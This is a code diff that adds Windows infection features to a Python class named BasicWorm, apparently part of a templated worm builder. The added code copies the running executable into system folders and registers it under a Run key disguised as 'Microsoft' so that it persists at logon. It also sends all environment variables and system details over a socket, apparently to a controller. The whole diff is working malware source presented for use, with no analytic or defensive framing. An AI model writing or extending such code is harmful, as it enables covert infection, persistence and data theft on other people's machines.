@@ -11,7 +11,13 @@ from time import sleep
 from threading import Thread
 from typing import Union
 
-
+{%if INFECT_WIN %}
+import shutil
+import winreg
+import sys
+import ctypes
+from ctypes import wintypes
+{%endif%}
 
 class BasicWorm:
     def __init__(self):
@@ -105,9 +111,69 @@ class BasicWorm:
         info = ["i", self.name, self._sysInfo, env]
         info = self.makeSysMsg(info)
         self.sendMsg(info)
+
+{%if INFECT_WIN %}
+    def getSysInfo(self) -> None:
+        self._sysInfo = f"{platform.system()} ## {platform.release()}"
+        self._sysEnv = os.environ
+        try:
+            env = ""
+            for k,i in self._sysEnv.items():
+                env += f"\n{k}  --  {i}"
+        except:
+            env = "Unknown"
+        info = ["i", self.name, self._sysInfo, env]
+        info = self.makeSysMsg(info)
+        self.sendMsg(info)
+
+    def getSysPath(self) -> list:
+        pnumber = [2, 13, 14, 20, 26, 35, 36, 37, 38, 39, 42] 
+        shell32 = ctypes.windll.shell32
+        buff = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
+        sys_path = []
+        for n in pnumber:
+            result = shell32.SHGetFolderPathW(None, n, None, 0, buff)
+            if result == 0:
+                sys_path.append(buff.value)
+        return sys_path
+
+    def regAddStart(self, fpath: str) -> bool:
+        try:
+            path = winreg.HKEY_CURRENT_USER
+            key = winreg.OpenKeyEx(path, "Software\\Microsoft\\Windows\\CurrentVersion")
+            new_key = winreg.CreateKey(key, "Run")
+            winreg.SetValueEx(new_key, "Microsoft", 0, winreg.REG_SZ, fpath)
+            return True
+        except:
+            return False
+
+    def cloning(self, fpath: str) -> Union[bool, str]:
+        me = os.path.abspath(sys.argv[0])
+        try:
+            shutil.copy2(me, fpath)
+            new = os.path.join(fpath, os.path.basename(me))
+            if os.path.exists(new):
+                return new
+            else:
+                return None
+            return os.path.join(fpath, os.path.basename(me))
+        except:
+            return None
+
+    def cloneMe(self) -> None:
+        loc = self.getSysPath()
+        for fl in loc:
+            fpa = self.cloning(fl)
+            if fpa:
+                if self.regAddStart(fpa):
+                    return True
+{%endif%}
     
 
     def START(self) -> None:
+{%if INFECT_WIN%}
+        self.cloneMe()
+{%endif%}
         while True:
             if not self.buildSocket():
                 sleep(self.pause_conn)
